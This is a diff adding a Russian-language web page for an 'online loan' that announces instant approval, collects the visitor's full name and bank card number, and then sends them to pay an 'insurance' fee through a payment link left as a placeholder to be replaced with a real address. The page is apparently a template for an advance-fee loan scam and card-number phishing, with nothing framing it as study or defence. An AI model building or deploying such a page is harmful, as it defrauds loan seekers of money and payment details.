@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Онлайн оформление кредита</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 500px;
+      margin: 30px auto;
+      background: white;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #2c3e50;
+      text-align: center;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      color: #333;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    button {
+      background-color: #27ae60;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background-color: #219150;
+    }
+    .status {
+      text-align: center;
+      margin-top: 20px;
+      font-weight: bold;
+      color: #2ecc71;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Кредит одобрен!</h1>
+    <p style="text-align: center; color: #555;">3-минутная проверка по базе прошла успешно.<br> Ваш заџвка одобрена на указанную сумму.</p>
+
+    <form id="creditForm">
+      <label>Ваше ФИО</label>
+      <input type="text" required>
+
+      <label>Номер карты для перевода</label>
+      <input type="text" required>
+
+      <label>Сумма кредита</label>
+      <input type="number" required>
+
+      <label>Срок в годах</label>
+      <select required>
+        <option value="1">1 год</option>
+        <option value="2">2 года</option>
+        <option value="3">3 года</option>
+        <option value="5">5 лет</option>
+        <option value="10">10 лет</option>
+      </select>
+
+      <button type="submit">Продолжить к оплате страховки</button>
+    </form>
+
+    <div class="status" id="statusMsg"></div>
+  </div>
+
+  <script>
+    const form = document.getElementById('creditForm');
+    const statusMsg = document.getElementById('statusMsg');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      statusMsg.innerText = "Перенаправляем на платежную страницу...";
+      setTimeout(() => {
+        window.location.href = "https://example.com/payment"; // заменить на реальный адрес оплаты
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
